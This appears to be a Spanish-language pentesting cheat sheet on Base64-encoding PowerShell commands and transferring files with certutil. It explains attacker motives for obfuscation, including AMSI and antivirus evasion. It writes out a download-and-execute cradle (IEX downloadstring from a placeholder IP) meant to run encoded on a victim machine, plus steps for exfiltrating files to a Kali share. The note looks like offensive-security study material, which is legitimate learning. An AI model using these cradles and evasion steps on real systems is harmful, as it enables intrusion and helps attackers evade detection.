# Codificando tus comandos de PowerShell en base64

Tags: #AD #Windows #Evasion #Base64 

La ofuscación es una técnica empleada por los atacantes para ocultar o camuflar el verdadero propósito de su código o comandos, con el objetivo de evadir la detección por parte de las soluciones de seguridad. Una de las formas más comunes de ofuscación en PowerShell es mediante la codificación en Base64. A continuación, se detallan las principales razones por las cuales un atacante podría optar por utilizar Base64 para ofuscar comandos en PowerShell:

```bash 
1. Evasión de la detección: Las soluciones antimalware y los sistemas de detección de intrusiones a menudo buscan patrones específicos o firmas de comandos maliciosos conocidos. La ofuscación en Base64 puede alterar el comando lo suficiente como para que no coincida con estas firmas, permitiendo que el código evada la detección.
    
2. Burlar controles de seguridad: Algunos controles de seguridad, como las políticas de ejecución de PowerShell, pueden bloquear scripts no firmados o de origen desconocido. Los atacantes pueden ofuscar y ejecutar código directamente desde la línea de comandos para evadir estos controles.
    
3. AMSI Evasión: Windows 10 introdujo la Antimalware Scan Interface (AMSI) que permite que las soluciones antimalware escaneen scripts en tiempo real. Algunas técnicas de ofuscación, incluido el uso de Base64, pueden ser utilizadas para intentar evadir la detección por AMSI.
    
4. Confusión y camuflaje: Al ofuscar un comando, los atacantes también pueden hacer que el análisis manual y la comprensión del código sean más difíciles. Esto puede ralentizar o dificultar el proceso de respuesta ante incidentes o la investigación forense.
    
5. Ejecución uniforme: La codificación en Base64 permite a los atacantes tener una representación uniforme de los datos, lo que puede ser útil para garantizar que su código se ejecute consistentemente, independientemente del sistema o del contexto en el que se esté ejecutando.
    
6. Incorporación de cargas útiles: Los atacantes a menudo necesitan incorporar cargas útiles dentro de otros scripts o documentos. La codificación Base64 permite que estas cargas útiles se representen como cadenas simples, lo que facilita su inclusión.
```

## Kali y Powershell

```powershell
# Codificas en Kali
❯ echo -n 'IEX (new-object net.webclient).downloadstring("http://IP/Invoke-Script.ps1")' | iconv -t UTF-16LE | base64 -w 0

	# echo -n 'IEX ...' = Imprime la cadena (que es el código PowerShell) sin añadir un nuevo línea al final.
	# | = Es un pipe, que toma la salida del comando anterior y la usa como entrada para el siguiente comando.
	# iconv -t UTF-16LE = Usa 'iconv' para convertir la cadena a UTF-16LE. PowerShell utiliza por defecto la codificación UTF-16LE para sus scripts codificados en Base64.
	# base64 -w 0 = Codifica la cadena convertida en Base64 sin dividirla en múltiples líneas ('-w 0' significa "no hacer wraps" o "no dividir en líneas").


# Ejecutas en PS de la maquina victima 
❯ powershell -enc "gy5wywg5e46gw46gw5sderyd"  # Decodificar y ejecutar el comando anterior en base64 para powershell 
```

## Transferencia de archivos con base64

```bash 
1. Archivos Binarios: La codificación Base64 es especialmente útil para archivos binarios que no son fácilmente representables como texto, como imágenes (`.jpg`, `.png`), archivos de audio (`.mp3`, `.wav`), archivos de video (`.mp4`, `.avi`), archivos ejecutables (`.exe`, `.dll`) y, por supuesto, archivos `.zip`.
    
2. Archivos de Texto y Scripts: También puedes codificar archivos de texto o scripts (como `.txt`, `.js`, `.py`, etc.) en Base64. No obstante, en muchos casos, codificar archivos de texto en Base64 es innecesario ya que estos archivos ya contienen caracteres legibles.
    
3. Corrupción de Archivos: La codificación y decodificación en Base64 no corromperá tus archivos siempre que el proceso se realice correctamente. Sin embargo, es importante que, si estás transfiriendo o almacenando la cadena Base64 resultante, asegures que no se altere ni modifique. Cualquier cambio en la cadena codificada resultará en un archivo decodificado corrupto.
    
4. Tamaño del Archivo: Es importante recordar que la codificación Base64 aumentará el tamaño del archivo original aproximadamente en un 33%. Esto se debe a la forma en que Base64 representa datos binarios en texto.
```

## Powershell

```powershell
❯ $bytes = [System.IO.File]::ReadAllBytes("20230903112419_script.zip")  # Agregar el archivo a una variable 
❯ $base64 = [System.Convert]::ToBase64String($bytes)                    # Convertir la variable a base64
❯ Set-Content -Value $base64 -Path psb64.txt                            # Obtener el archivo que contiene el valor de la variable codificada en base64

❯ certutil -decode .\psb64.txt comply.zip                          # Decodificar el archivo en base64 para powershell 
```

## Certutil

```powershell
❯ certutil -encode 20230903112419_script.zip certb64.txt           # Codificar el archivo en base64 y obtener uno en txt 

# Trasladar el contenido para decodificar
❯ net use \\192.168.45.191\kali-share /u:kali kali
❯ copy certb64.txt \\192.168.45.191\kali-share\certb64.txt
❯ copy psb64.txt \\192.168.45.191\kali-share\psb64.txt

# Decodificar y obtener el archivo original
❯ certutil -decode .\psb64.txt comply.zip                          # Decodificar el archivo en base64 para powershell 
```

